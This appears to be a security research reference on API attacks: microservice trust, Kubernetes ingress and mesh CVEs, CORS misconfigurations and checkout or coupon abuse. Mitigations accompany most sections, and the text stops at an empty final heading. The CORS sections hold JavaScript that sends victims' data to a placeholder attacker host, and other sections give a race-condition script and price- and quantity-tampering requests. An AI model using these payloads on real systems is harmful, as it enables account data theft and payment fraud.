# Advanced API Attack Vectors: Microservice, CORS, and Business Logic Attacks (2023-2026)

## Microservice-Specific Attacks

### Service-to-Service Authentication Bypass

#### Takeaway
Service-to-service authentication bypass exploits implicit trust between internal microservices, typically through missing audience validation on JWT tokens, replaying internal requests through external-facing proxies, or inheriting trust relationships after compromising a single service.

#### Cited Findings
- JumpServer (CVE-2023-43652, CVE-2023-46123): A microservice design flaw allowed requests meant for one internal component to be replayed through the web proxy to the core API, bypassing authentication. The Koko service's public-key authentication path never verified that requests actually originated from the Koko service. — [SonarSource](https://www.sonarsource.com/blog/diving-into-jumpserver-attackers-gateway-to-internal-networks-1-2/)
- Services that skip JWT audience (`aud`) validation accept any token issued by a trusted issuer, regardless of the intended recipient service. An attacker who obtains a token scoped to Service A can present it to Service B if B only validates the issuer signature. — [SC World](https://www.scworld.com/tech-explainer/service-to-service-authentication-patterns-for-securing-api-and-microservice)
- OWASP recommends implementing mutual TLS (mTLS) to prevent direct, anonymous connections to internal services, preventing API gateway bypass. — [OWASP Microservices Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Microservices_Security_Cheat_Sheet.html)
- FortiOS CVE-2024-55591 (CVSS 9.6): Authentication bypass through an alternate path (Node.js websocket module) demonstrates the general pattern of secondary paths with weaker controls. Attackers created super_admin accounts on internet-facing FortiGate firewalls. — [DEV Community](https://dev.to/roxdavirox/cve-2024-55591-how-an-auth-bypass-became-an-internet-scale-firewall-takeover-25b3)

**Common Attack Patterns:**
1. **Gateway Bypass**: Directly accessing internal services by reaching their ports/endpoints without going through the API gateway. If services trust all traffic on the internal network, no authentication is enforced.
2. **Token Audience Confusion**: Obtaining a JWT scoped for one service and presenting it to another service that only validates the issuer signature, not the audience claim.
3. **Request Replay Through Proxy**: Replaying internal service-to-service requests through an external-facing proxy that lacks origin validation (JumpServer pattern).
4. **Lateral Movement via Compromised Service**: After compromising one microservice, using its service account credentials or mTLS certificates to authenticate to peer services.

#### Inferences
- The root cause in most cases is implicit trust: services assume that if a request reached them on the internal network, it was authorized. Zero-trust architecture (validate every request regardless of network origin) directly addresses this.
- JWT audience validation is a low-effort, high-impact control that prevents cross-service token reuse but is frequently omitted during development.

#### Gaps
- No publicly documented 2024-2025 campaign specifically targeting service-to-service JWT audience confusion in a production microservice deployment was found.

---

### Event Bus Poisoning (Kafka, RabbitMQ, AWS SNS/SQS)

#### Takeaway
Event bus poisoning attacks inject crafted messages into message brokers to trigger unintended behavior in downstream consumers. The attack surface includes unauthorized topic access, schema manipulation, and exploitation of deserialization in consumers.

#### Cited Findings
- CVE-2018-17196 (Apache Kafka 0.11.0.0 to 2.1.0): A crafted Produce request bypassed transaction and idempotent ACL validation, allowing a client with basic Write permission to bypass additional authorization checks. CVSS 8.8 (High). — [OSV](https://osv.dev/vulnerability/CVE-2018-17196)
- CVE-2024-27309 (Kafka ZooKeeper-to-KRaft migration): During migration, ACLs could be ignored under specific conditions (an ACL removal when two or more ACLs remained on a resource). DENY ACLs being ignored could expose confidentiality and integrity. — [stack.watch](https://stack.watch/vuln/CVE-2024-27309)
- CVE-2024-36543 (Strimzi Kafka Connect REST API): Incorrect access control in the Connect REST API allowed attackers to mirror topic content through malicious connectors, bypassing Kafka ACLs, and potentially stealing SASL credentials. Affects Strimzi 0.41.0 and earlier. — [INCIBE](https://www.incibe.es/en/incibe-cert/early-warning/vulnerabilities/cve-2024-36543)
- Kafka's architecture provides TLS encryption and JAAS-based authentication to control which applications access the broker, but these must be explicitly configured. — [AWS](https://aws.amazon.com/compare/the-difference-between-rabbitmq-and-kafka/)

**Attack Vectors:**
1. **Unauthorized Topic Production**: If ACLs are misconfigured or bypassed (CVE-2018-17196), an attacker can inject messages into topics consumed by business-critical services.
2. **Connector Abuse**: Kafka Connect connectors with overly broad access can be weaponized to mirror or exfiltrate topic data (CVE-2024-36543).
3. **Deserialization Attacks**: Consumers that deserialize messages without schema validation are vulnerable to crafted payloads triggering code execution (e.g., Java deserialization gadget chains in consumers using ObjectInputStream).
4. **Schema Registry Poisoning**: If the schema registry lacks authentication, an attacker can register a modified schema that causes consumers to misparse messages or triggers type-confusion bugs.
5. **Dead Letter Queue Manipulation**: Messages intentionally crafted to fail processing can accumulate in dead-letter queues, causing resource exhaustion or being reprocessed with different handling logic.

#### Inferences
- The Strimzi CVE (2024-36543) demonstrates that message broker security extends beyond the broker itself: the Connect API, Schema Registry, and management interfaces each have their own access control surface.
- Migration periods (CVE-2024-27309) are high-risk windows where security invariants may temporarily break.

#### Gaps
- No documented real-world exploitation campaign targeting event bus poisoning in a production microservice architecture was found in the 2023-2026 timeframe. The CVEs describe the vulnerabilities but not confirmed exploitation.
- Specific RabbitMQ and AWS SNS/SQS injection CVEs from this period were not found in the search results.

---

### Kubernetes Ingress Controller and Service Mesh Attacks

#### Takeaway
Kubernetes ingress controllers and service mesh proxies have been the subject of critical CVEs (up to CVSS 9.8), with the ingress-nginx admission controller RCE (CVE-2025-1974) and multiple Istio/Envoy path-matching bypasses representing the most severe attack surfaces in 2024-2026.

#### Cited Findings
- **CVE-2025-1974 (ingress-nginx, CVSS 9.8)**: An unauthenticated attacker with pod network access could achieve arbitrary code execution in the ingress-nginx controller, which in default installations can read all Secrets cluster-wide. Public PoC exists. Discovered by Wiz researchers. Exploitation in the wild was not detected as of March 25, 2025. — [NCSC Ireland](https://ncsc.gov.ie/pdfs/2503250145_Vulns_Kubernetes_Ingress-NGINX.pdf); [BytePlus](https://docs.byteplus.com/en/docs/byteplus-security-bulletins/CVE-2025-1974)
- Related ingress-nginx CVEs disclosed together: CVE-2025-1097, CVE-2025-1098, and CVE-2025-24514, all rated 8.8 (High). The CalCSIC advisory states these can be chained for cluster takeover with no credentials required. — [CalCSIC Advisory](https://www.caloes.ca.gov/wp-content/uploads/Homeland-Security/Documents/Cyber-Advisories/CalCSIC-Cyber-Advisory_Kubernetes-Vulnerabilities-Impacting-Ingress-NGINX-Controller.pdf)
- **CVE-2026-73553 (Istio/Envoy, CVSS 7.5)**: RBAC bypass when path parameters are ignored. A path like `/admin;x` could reach a protected route because Envoy stripped the parameter segment before matching while the backend interpreted the full path. — [Istio Security Advisory ISTIO-SECURITY-2026-006](https://istio.io/latest/news/security/istio-security-2026-006/)
- **CVE-2026-73511 (Istio/Envoy, CVSS 5.3)**: Path matching for paths with per-segment parameters could cause Envoy and backends to select different resources, bypassing path-based authentication. — [Istio Security Advisory ISTIO-SECURITY-2026-006](https://istio.io/latest/news/security/istio-security-2026-006/)
- **CVE-2025-24030 (Envoy Gateway)**: Path traversal via the metrics endpoint allowed cluster users to reach the Envoy admin interface, potentially exposing proxy configuration or terminating Envoy. — [GitLab Advisory Database](https://advisories.gitlab.com/pkg/golang/github.com/envoyproxy/gateway/CVE-2025-24030/)
- Ingress-nginx reached end-of-life in March 2026, meaning future CVEs in the controller will not receive upstream patches. — [Okteto](https://www.okteto.com/blog/ingress-nginx-controller-deprecation-your-migration-guide-to-kubernetes-gateway-api/)

**Attack Flow for CVE-2025-1974 (IngressNightmare):**
1. Attacker gains pod-level network access (compromised pod, or cloud network access to cluster CIDR).
2. Attacker sends crafted admission review requests to the ingress-nginx validating webhook endpoint (typically port 8443).
3. The admission controller processes the request, and the crafted payload achieves code execution in the controller's context.
4. The controller's service account can read Kubernetes Secrets across all namespaces by default.
5. Attacker exfiltrates secrets (TLS certificates, API keys, database credentials) and potentially achieves full cluster compromise.

**Mitigations:** Restrict admission controller access so only the Kubernetes API Server can reach it. Disable the validating admission webhook as a temporary workaround. Upgrade to ingress-nginx 1.11.5+ or 1.12.1+.

#### Inferences
- The path-matching differential between Envoy proxy and backend servers (CVE-2026-73511, CVE-2026-73553) is a systemic issue. Any architecture where a proxy normalizes or strips path components differently from the backend creates a bypass surface.
- The deprecation of ingress-nginx creates a security cliff: organizations still running it after March 2026 receive no patches for future vulnerabilities.

#### Gaps
- Detailed exploitation steps for CVE-2025-1974 beyond the advisory description were not extracted, as the PoC details are in referenced GitHub advisories that could not be fetched.

---

### Container Sidecar Injection Attacks

#### Takeaway
Container sidecar injection exploits Kubernetes pod-creation privileges to inject malicious containers alongside legitimate workloads, enabling traffic interception, credential theft, and persistent access within service mesh architectures.

#### Cited Findings
- **CVE-2026-23766 (Istio)**: Argument injection through the `traffic.sidecar.istio.io/excludeInterfaces` annotation allowed users with pod-creation rights to inject iptables arguments and alter traffic flow in the pod's network namespace. Affects Istio through 1.28.2. — [SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2026-23766/)
- Trend Micro (April 2024) demonstrated that attackers can use sidecar injection as a stealth persistence technique after compromising a Kubernetes cluster, avoiding detection by blending into the expected mesh sidecar pattern. — [Trend Micro](https://trendmicro.com/vinfo/de/security/news/security-technology/page/1)
- Pod containers share volumes including the service-account token directory (`/var/run/secrets/kubernetes.io/serviceaccount`). An injected sidecar can read the pod's service account token and request its own mesh certificate, impersonating the legitimate service. — [InstaTunnel](https://scour.ing/@abnv/p/https://instatunnel.my/blog/the-sidecar-siphon-exploiting-identity-leaks-in-service-mesh-architectures)
- Safeguard.sh notes that in 2024, Envoy CVEs allowed attackers to slip past authorization checks and crash the proxy. — [Safeguard](https://safeguard.sh/resources/blog/sidecar-proxies-and-the-expanding-attack-surface-of-service-meshes)

**Attack Vectors:**
1. **Malicious Sidecar Injection**: An attacker with pod-creation or pod-mutation privileges adds a container to a pod spec that intercepts network traffic or reads shared volumes.
2. **Annotation-Based iptables Manipulation**: Exploiting Istio annotations (CVE-2026-23766) to alter network rules, redirecting traffic through attacker-controlled containers.
3. **Service Account Token Theft**: Reading the shared service account token from within an injected sidecar to impersonate the service to the mesh control plane.
4. **Sidecar-as-Persistence**: Injecting a sidecar that survives pod restarts and blends in with legitimate mesh infrastructure, making detection difficult.

#### Inferences
- The shared-namespace model of sidecar containers (shared network, filesystem mounts, and process visibility) means that any container in the pod has access to the mesh identity. This is a fundamental architectural trade-off.
- Admission webhooks that enforce sidecar injection policies and block unauthorized annotations are the primary defensive control.

#### Gaps
- No documented real-world attack campaign using sidecar injection as the primary vector was found. The Trend Micro research demonstrates feasibility but does not cite a specific incident.

---

### Service Discovery Exploitation (Consul, etcd, ZooKeeper)

#### Takeaway
Service discovery systems are high-value targets because they contain the service registry (what services exist and where they run), health status, and often configuration data including secrets. CVEs in 2024-2025 primarily involve denial-of-service and authorization issues rather than direct remote code execution.

#### Cited Findings
- **CVE-2024-10086 (Consul)**: Listed in Debian's security tracker alongside CVE-2024-10005 and CVE-2024-10006. Specific details on impact were not extracted from the search results. — [Debian Security Tracker](https://security-tracker.debian.org/tracker/source-package/consul)
- **CVE-2025-11374 (Consul)**: Denial-of-service in the key/value endpoint caused by incorrect Content-Length header validation. Fixed in Consul Community Edition 1.22.0. Published 2025-11-05. — [Sonatype](https://guide.sonatype.com/vulnerability/CVE-2025-11374); [OSV GO-2025-4081](https://osv.dev/vulnerability/GO-2025-4081)
- **CVE-2024-23324 (Consul, CVSS 7.5)**: Listed in Gentoo GLSA-202412-14 as a high-severity vulnerability. — [Tenable](https://www.tenable.com/plugins/nessus/212181)
- ZooKeeper advisories (CVE-2025-13151 and multiple 2026 CVEs) were listed but specifics were not available in the search results. — [CleanStart Advisory](https://api.osv.dev/v1/vulns/CLEANSTART-2026-GN22652)

**Attack Patterns Against Service Discovery:**
1. **Service Registry Poisoning**: Registering rogue service instances that redirect traffic to attacker-controlled endpoints. Requires write access to the service catalog.
2. **Health Check Manipulation**: Marking legitimate services as unhealthy or attacker services as healthy to redirect traffic.
3. **Configuration/Secret Exfiltration**: Service discovery systems often store configuration KV pairs, potentially including database credentials, API keys, or TLS certificates.
4. **DNS Spoofing via Service Discovery DNS**: Many service discovery systems provide DNS interfaces; poisoning DNS responses redirects inter-service traffic.
5. **ACL Bypass**: Exploiting CVEs in authorization logic to read or write to the registry without proper credentials.

#### Inferences
- The Consul CVE pattern (DoS through malformed requests, authorization edge cases) suggests that the ACL implementation is a complex surface. Organizations should enable and test ACLs even in "internal" deployments.
- etcd's lack of results in the search may reflect its typically tighter deployment (bound to localhost or cluster-internal with client certificates) rather than an absence of vulnerabilities.

#### Gaps
- No etcd-specific CVEs from 2024-2025 were found in the search results. A targeted search of the etcd GitHub advisory database would be needed.
- Specific attack reproduction steps for service registry poisoning were not found in documented advisories.

---

## CORS Misconfiguration Advanced Attacks

### Null Origin Attacks

#### Takeaway
The `null` Origin is sent by browsers in specific contexts (sandboxed iframes, local file:// pages, cross-origin redirects, data: URIs). If a server whitelists the literal string `null`, an attacker on any domain can craft a request with a null Origin using a sandboxed iframe, enabling cross-origin data theft when credentials are reflected.

#### Cited Findings
- The null origin is sent in sandboxed iframes (`<iframe sandbox="allow-scripts">`), file:// protocol pages, and cross-origin redirects. If a server responds with `Access-Control-Allow-Origin: null` and `Access-Control-Allow-Credentials: true`, any site can exploit this. — [Hackviser](https://hackviser.com/tactics/pentesting/web/cors-misconfiguration); [FreeCODECamp](https://www.freecodecamp.org/news/exploiting-cors-guide-to-pentesting/)
- Exploitability requires `Access-Control-Allow-Credentials: true` alongside the reflected null origin. Without credentials, the attack is limited to non-authenticated data. — [DEV Community](https://dev.to/roxdavirox/cors-misconfiguration-in-apis-why-reflected-origin-plus-credentials-is-the-dangerous-pattern-not-5ip)

**Exploitation Steps:**
1. Identify that the target API responds to `Origin: null` with `Access-Control-Allow-Origin: null` and `Access-Control-Allow-Credentials: true`.
2. Create an attacker-controlled page with a sandboxed iframe:
```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
  <script>
    fetch('https://target-api.com/api/user/profile', {
      credentials: 'include'
    })
    .then(r => r.json())
    .then(data => {
      // Exfiltrate to attacker server
      fetch('https://attacker.com/collect?data=' + btoa(JSON.stringify(data)));
    });
  </script>
"></iframe>
```
3. The sandboxed iframe sends requests with `Origin: null`.
4. The target API reflects `Access-Control-Allow-Origin: null` with credentials, so the browser allows the iframe to read the response.
5. Victim's authenticated data is exfiltrated to the attacker's server.

#### Inferences
- The null origin attack works from any domain without subdomain takeover or other prerequisites, making it the most broadly exploitable CORS misconfiguration when present.

#### Gaps
- No specific CVE or bug bounty payout for a null origin CORS attack in 2024-2025 was found in the search results.

---

### Subdomain Takeover + CORS Chaining

#### Takeaway
When a CORS policy trusts all subdomains (`*.example.com`) and an unused subdomain's DNS record points to an unclaimed external resource (e.g., a decommissioned S3 bucket, Heroku app, or GitHub Pages site), an attacker can claim that resource and serve malicious JavaScript from a trusted origin.

#### Cited Findings
- Allowing all subdomains of a domain (`*.example.com`) can be exploited if any subdomain is compromised, forgotten, or can be claimed by an attacker. Example: `old-staging.company.com` pointing to a decommissioned cloud resource. — [Hackviser](https://hackviser.com/tactics/pentesting/web/cors-misconfiguration)
- The attack chain: (1) identify a dangling CNAME or A record on a subdomain, (2) claim the external resource it points to, (3) serve JavaScript that makes credentialed cross-origin requests to the main application, which trusts the subdomain's origin. — [PayloadPlayground](https://payloadplayground.com/blog/cors-misconfiguration-exploitation-guide)

**Exploitation Steps:**
1. Enumerate subdomains of the target (e.g., via certificate transparency logs, DNS brute-forcing).
2. Identify dangling DNS records pointing to claimable resources (e.g., `old-staging.example.com` CNAME to `example-staging.herokuapp.com`, which is unclaimed).
3. Claim the external resource (create the Heroku app, S3 bucket, etc.).
4. Deploy a page on the taken-over subdomain that makes credentialed requests to the main API:
```javascript
// Hosted at https://old-staging.example.com/exploit.html
fetch('https://api.example.com/api/account/details', {
  credentials: 'include'
})
.then(r => r.json())
.then(data => {
  navigator.sendBeacon('https://attacker.com/exfil', JSON.stringify(data));
});
```
5. The main API sees `Origin: https://old-staging.example.com`, matches against `*.example.com`, reflects it with credentials, and the browser allows the read.
6. Lure victims to `https://old-staging.example.com/exploit.html` to execute the attack.

#### Inferences
- This attack chain amplifies two individually lower-severity issues (subdomain takeover + overly broad CORS) into a high-severity credential-bearing cross-origin data theft.

#### Gaps
- No specific recent (2024-2025) bug bounty report combining subdomain takeover with CORS exploitation was found, though the technique is well-established.

---

### Regex-Based Origin Validation Bypass

#### Takeaway
Custom regex-based origin validation is a frequent source of CORS bypasses due to unescaped metacharacters (especially dots), unanchored patterns (missing `$` at end), and prefix-only matching. Multiple CVEs in 2025-2026 confirm this as a systemic issue across frameworks.

#### Cited Findings
- **CVE-2026-25478 (Litestar, CVSS 7.4)**: Unescaped dots in allowed origins meant `https://good.example` also matched `https://goodXexample` (where X is any character). — [Corgea](https://corgea.com/advisories/vulnerabilities/CVE-2026-25478); [GitLab Advisory](https://advisories.gitlab.com/pypi/litestar/CVE-2026-25478/)
- **CVE-2026-40110 (Jupyter Server)**: Python's `re.match()` anchors only at the start, so a pattern for `https://trusted.example.com` also matched `https://trusted.example.com.evil.com`. Fixed in version 2.18.0. — [Lutra Security](https://fieldguide.lutrasecurity.com/CVE-2026-40110/)
- **CVE-2026-37737 (sanic-cors)**: Same unanchored `re.match()` issue. `try_match()` used `re.match` without end-anchoring the regular expression. — [SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2026-37737/)
- Common bypass patterns: `r"https://.*\.example\.com"` matches `https://evil.com/.example.com`; `startswith("https://trusted.com")` allows `https://trusted.com.evil.com`. — [Shoulder.dev](https://shoulder.dev/rules/python-cors-regex-bypass)

**Bypass Payloads:**
| Intended Allowlist | Bypass Origin | Root Cause |
|---|---|---|
| `example.com` | `attackerexample.com` | Unanchored prefix match |
| `*.example.com` | `evil.example.com` (after subdomain takeover) | Wildcard subdomain trust |
| `https://app.example.com` | `https://app.example.com.evil.com` | Missing `$` anchor |
| `https://good.example` | `https://goodXexample` | Unescaped dot in regex |
| `https://.*\.example\.com` | `https://evil.com/.example.com` | Overly permissive regex |

**Recommended Fix:** Use exact-match allowlists. If regex is unavoidable, use `re.fullmatch()` (Python) or equivalent, anchor both ends (`^...$`), and escape all dots.

#### Inferences
- The recurrence of identical bugs across three independent Python frameworks (Litestar, Jupyter Server, sanic-cors) suggests the pattern is deeply embedded in how developers implement CORS origin checks. Framework-level defaults should use exact matching.

#### Gaps
- No equivalent CVEs for Go, Java, or Node.js frameworks were found in these search results, though the pattern likely exists.

---

### Vary Header Cache Poisoning via CORS

#### Takeaway
When a server responds with different `Access-Control-Allow-Origin` headers based on the request's `Origin` but fails to include `Vary: Origin`, CDN and reverse-proxy caches store one origin's CORS response and serve it to all origins, causing either false CORS blocks or unauthorized cross-origin access.

#### Cited Findings
- A GitHub issue against openndx-core found that `Vary: Origin` was only set inside the allowed-origin branch, so responses to rejected origins carried no Vary header. That response could then be cached and served to an allowed origin, blocking legitimate CORS requests. — [GitHub openndx-core #496](https://github.com/openndx/openndx-core/issues/496)
- **Netty CorsHandler (CVE-2026-59903)**: The handler overwrote a backend's `Vary` header (e.g., `Vary: Authorization` or `Vary: Cookie`) with `Vary: origin`, which could let a cache return one user's sensitive response to another user. — [GitHub Netty Advisory GHSA-8c42-7qj2-3j46](https://github.com/netty/netty/security/advisories/GHSA-8c42-7qj2-3j46)
- CloudFront does not respect Vary headers by default and requires explicit configuration to forward and cache based on the Origin header. — [Pixelite](https://www.pixelite.co.nz/article/cors-caching-and-the-vary-http-header/)
- Whichever origin populates the cache first determines the CORS headers served to all subsequent requestors until the cache entry expires, creating intermittent failures that appear random. — [cross-origin.com](https://www.cross-origin.com/server-side-cors-configuration-header-management/access-control-header-directives/handling-vary-origin-header-correctly/)

**Attack Scenario:**
1. Target API dynamically reflects `Access-Control-Allow-Origin` based on request Origin but omits `Vary: Origin`.
2. CDN/reverse proxy caches the response keyed only on URL (not on Origin).
3. Attacker sends a request from `https://evil.com` first, populating the cache with `Access-Control-Allow-Origin: https://evil.com`.
4. Legitimate requests from `https://app.example.com` receive the cached response with the wrong CORS header.
5. **Reverse scenario (more dangerous)**: Legitimate request populates cache with `Access-Control-Allow-Origin: https://app.example.com`. Attacker's origin receives the cached response with a permissive CORS header for the legitimate origin -- but the browser blocks this because the origin does not match.
6. **Most dangerous**: If the API reflects any origin AND the cache serves the reflected-origin response to all requestors, the first requester's origin becomes the universally permitted origin.

**Defenses:**
- Always send `Vary: Origin` on every response that depends on Origin, including rejected origins.
- Validate origins against an explicit allowlist, never reflect arbitrary origins.
- Configure CDN to include Origin in cache key when origin-dependent headers are present.
- Ensure CORS middleware does not overwrite application-set Vary headers (Netty bug).

#### Inferences
- CDN-layer CORS caching issues are particularly insidious because they produce intermittent, hard-to-reproduce failures that depend on cache population order.
- The Netty CVE demonstrates that CORS middleware can introduce security issues even when the application's own CORS logic is correct, by overwriting Vary headers.

#### Gaps
- No documented exploitation of CORS cache poisoning as an attack (rather than a bug causing availability issues) was found in the 2024-2025 timeframe.

---

### Preflight Cache Considerations

#### Takeaway
The browser's preflight cache and CDN/proxy caches operate independently, creating distinct attack surfaces. The browser cache keys preflight results by URL + requesting origin, while CDN caches often ignore the Origin header unless explicitly configured.

#### Cited Findings
- A Chromium bug report documents that the preflight cache did not consider origin in certain cases, potentially allowing a preflight response cached for one origin to be used by another. — [Chromium Issues](https://issues.chromium.org/issues/41025985)
- The Fetch Standard specifies that preflight entries should be keyed by URL and requesting origin, but CDN and reverse-proxy caches only segment by the fields listed in the Vary header. — [cross-origin.com](https://www.cross-origin.com/server-side-cors-configuration-header-management/access-control-header-directives/handling-vary-origin-header-correctly/)

#### Inferences
- Preflight cache poisoning at the CDN level is a variant of the Vary header issue: if the CDN caches an OPTIONS response for one origin and serves it to another, the second origin may receive incorrect Access-Control-Allow-Methods or Access-Control-Allow-Headers, either blocking legitimate requests or permitting unauthorized ones.

#### Gaps
- No documented real-world exploitation of preflight cache poisoning was found. The attack is theoretically possible but appears to have limited practical impact because browsers perform their own preflight validation.

---

## Business Logic API Attacks

### Multi-Step API Workflow Manipulation (Checkout, Approval, Payment Flows)

#### Takeaway
Multi-step API workflows are vulnerable when they rely on client-side state progression, allow steps to be skipped or reordered, or fail to validate the cumulative state at each transition. Checkout flows, payment processing, and approval chains are the most commonly exploited patterns.

#### Cited Findings
- A client-supplied price field in a checkout endpoint lets the attacker set their own total. "The endpoint is vulnerable if the checkout total reflects the client-supplied value instead of the catalog price." CVE-2021-36030 (Magento) is cited as an example. — [Intigriti](https://www.intigriti.com/blog/news/top-6-price-manipulation-vulnerabilities-ecommerce)
- Payment gateway integrations are vulnerable when the application uses client-supplied amounts rather than server-calculated totals in the payment API call. — [Medium (vasuyadav0786)](https://vasuyadav0786.medium.com/exploiting-payment-gateways-97ce7af5a9cf)
- Imperva's State of API Security report found 27% of API attacks in 2023 were business logic attacks, up from 17% the year before. — [APISec.ai](https://www.apisec.ai/blog/race-condition-vulnerabilities-in-apis)

**Common Workflow Manipulation Techniques:**
1. **Step Skipping**: Jumping from step 1 (add to cart) directly to step 4 (order confirmation) without going through payment (step 3). Test by calling later-stage endpoints directly without completing prior steps.
2. **Parameter Tampering Between Steps**: Modifying price, quantity, or item ID between the cart and payment steps when these are client-supplied.
3. **Replaying Successful Payment Tokens**: Reusing a payment confirmation token from a low-value transaction to "pay for" a high-value order.
4. **Approval Flow Bypass**: In multi-approver workflows, submitting the approval endpoint directly, or modifying the approval status field if it is client-controlled.

**Example Payload (Price Manipulation):**
```http
POST /api/checkout/complete HTTP/1.1
Content-Type: application/json

{
  "cart_id": "abc123",
  "payment_method": "card_xyz",
  "total": 0.01,           // Tampered: original was 499.99
  "currency": "USD",
  "items": [
    {"id": "item_001", "price": 0.01, "qty": 1}  // Tampered price
  ]
}
```

#### Inferences
- The root cause is trusting client-supplied values for server-authoritative data. Every price, total, discount, and quantity should be recalculated server-side at the point of payment processing.
- Multi-step workflows need server-side state machines that enforce valid transitions and reject out-of-order requests.

#### Gaps
- Specific 2024-2025 bug bounty payouts for checkout flow manipulation were not found with verifiable details.

---

### Race Condition / Parallel Request Business Logic Abuse

#### Takeaway
Race conditions in API endpoints that perform check-then-act operations (TOCTOU) enable attackers to bypass limits, double-spend balances, and duplicate rewards. The HTTP/2 single-packet attack technique has made these attacks significantly more reliable.

#### Cited Findings
- The HTTP/2 single-packet attack technique (James Kettle, 2023) reduced race-condition exploit time from 2+ hours to approximately 30 seconds by queuing requests behind a gate and releasing them in a single TCP packet. — [APISec.ai](https://www.apisec.ai/blog/race-condition-vulnerabilities-in-apis)
- For HTTP/1.1 targets, last-byte synchronization holds back the final byte of each request and releases them simultaneously to achieve similar timing. — [HackTricks](https://book.hacktricks.xyz/pentesting-web/race-condition)
- A bug bounty write-up describes an insurance platform where parallel GraphQL "create profile" requests via Turbo Intruder resulted in duplicate profile creation, earning a $500 bounty. — [Medium (info.adityabhatt3010)](https://medium.com/@info.adityabhatt3010/bug-bounty-race-exploiting-race-conditions-for-infinite-discounts-a2cb2f233804)
- Common race-condition targets: account balance transfers, limited-stock purchases, coupon redemption, rate-limited operations (login attempts, SMS verification), referral reward claims. — [YesWeHack](https://www.yeswehack.com/learn-bug-bounty/ultimate-guide-race-condition-vulnerabilities)

**Exploitation Technique (Turbo Intruder HTTP/2 Single-Packet):**
```python
# Turbo Intruder script for HTTP/2 single-packet attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          engine=Engine.BURP2)  # HTTP/2

    # Queue N identical requests
    for i in range(20):
        engine.queue(target.req, gate='race')

    # Release all requests simultaneously in a single packet
    engine.openGate('race')

def handleResponse(req, interesting):
    table.add(req)
```

**Key Targets:**
| Target | Impact | Check-Then-Act Pattern |
|---|---|---|
| Balance transfer | Double-spend | Check balance >= amount, then debit |
| Coupon redemption | Multiple uses of single-use coupon | Check coupon unused, then mark used |
| Limited stock | Over-purchase | Check stock > 0, then decrement |
| Referral reward | Duplicate rewards | Check referral unclaimed, then credit |
| Rate limiting | Bypass attempt limits | Check attempts < max, then increment |

**Defenses:** Database-level locking (`SELECT ... FOR UPDATE`), optimistic concurrency control with version numbers, idempotency keys, atomic compare-and-swap operations.

#### Inferences
- The HTTP/2 single-packet technique is a game-changer because it eliminates network jitter as a variable, making race conditions reliably exploitable rather than probabilistic.
- Any endpoint that reads state, makes a decision, and then writes state without atomic locking is potentially vulnerable.

#### Gaps
- A documented case of single-packet race exploitation against a production financial API with verified financial impact was not found.

---

### Coupon/Discount Stacking and Manipulation

#### Takeaway
Coupon stacking attacks exploit the lack of server-side validation on combined discounts, allowing attackers to apply multiple incompatible coupons, push totals below zero (resulting in credits), or bypass single-use restrictions through race conditions.

#### Cited Findings
- A percentage coupon combined with a fixed-amount shipping coupon can push the final price below zero if the code never checks the combined discount against the subtotal, resulting in the store paying the customer. — [SUSA Test](https://www.susatest.com/blog/common-coupon-codes-bugs)
- Two different coupons applied simultaneously via race condition bypassed the mutual-exclusion check. — [APISec.ai](https://www.apisec.ai/blog/race-condition-vulnerabilities-in-apis)
- HackerOne report #364843 (Upserve/OLO) is cited as an example of negative-quantity cart manipulation, though the report details could not be independently verified. — [DEV Community](https://dev.to/roxdavirox/business-logic-in-e-commerce-apis-price-manipulation-negative-quantity-and-coupon-abuse-19pi)

**Attack Patterns:**
1. **Stacking Incompatible Coupons**: Apply coupon A (20% off) then coupon B ($50 off) when the system should only allow one.
   ```http
   POST /api/cart/apply-coupon
   {"cart_id": "abc", "coupon_code": "SAVE20"}
   // Then immediately:
   POST /api/cart/apply-coupon
   {"cart_id": "abc", "coupon_code": "FLAT50OFF"}
   ```
2. **Race Condition on Single-Use Coupons**: Send multiple redemption requests simultaneously for a coupon that should be one-time-use.
3. **Negative Total Exploitation**: Combine percentage and fixed discounts to produce a negative order total, potentially resulting in a credit or refund.
4. **Coupon Code Enumeration**: Brute-forcing coupon codes when the API does not rate-limit or returns distinct error messages for "invalid" vs "expired" codes.
5. **Coupon Transfer**: Applying a coupon generated for one account to another account's cart.

#### Inferences
- The most reliable defense is enforcing discount caps (total discount cannot exceed order subtotal) and mutual exclusion rules at the database level, not in application logic.

#### Gaps
- Specific dollar amounts or bounty payouts for coupon stacking bugs in 2024-2025 were not found.

---

### Inventory Manipulation (Phantom Inventory, Negative Quantity)

#### Takeaway
Negative quantity attacks exploit missing server-side input validation to subtract item prices from cart totals or create phantom inventory entries. The technique is simple but frequently effective because developers validate data types but not business-rule constraints.

#### Cited Findings
- A negative quantity in a request caused the server to subtract an item's price from the cart total: "The attacker sent a valid JSON body with `quantity: -1`, and the server subtracted the item price from the cart total. The spec never required quantity to be positive." — [DEV Community](https://dev.to/roxdavirox/business-logic-in-e-commerce-apis-price-manipulation-negative-quantity-and-coupon-abuse-19pi)
- Quantity tampering "may not always work depending on how the value is validated and later on processed" -- some systems validate at the API layer but not at the database layer, or vice versa. — [Intigriti](https://www.intigriti.com/blog/news/top-6-price-manipulation-vulnerabilities-ecommerce)

**Example Payloads:**
```http
POST /api/cart/add HTTP/1.1
Content-Type: application/json

{"item_id": "expensive_item_001", "quantity": -1}
```

```http
PUT /api/cart/update HTTP/1.1
Content-Type: application/json

{"cart_id": "abc123", "items": [
  {"id": "cheap_item", "quantity": 1, "price": 9.99},
  {"id": "expensive_item", "quantity": -1, "price": 999.99}
]}
// Net total: 9.99 - 999.99 = -990.00 (potential credit)
```

**Additional Vectors:**
- **Integer overflow**: Sending `quantity: 2147483647` (INT_MAX) may wrap to negative on the server.
- **Decimal quantities**: `quantity: 0.001` for items sold in whole units may bypass integer checks.
- **Zero-quantity orders**: Adding items with `quantity: 0` may bypass payment but still trigger fulfillment in poorly designed systems.

#### Inferences
- Input validation must enforce business rules (positive integers, maximum quantities, catalog prices) at the API gateway, application layer, AND database constraint level for defense in depth.

#### Gaps
- No specific CVE for inventory manipulation in a named product was found in 2024-2025.

---

### Currency Rounding Exploitation

#### Takeaway
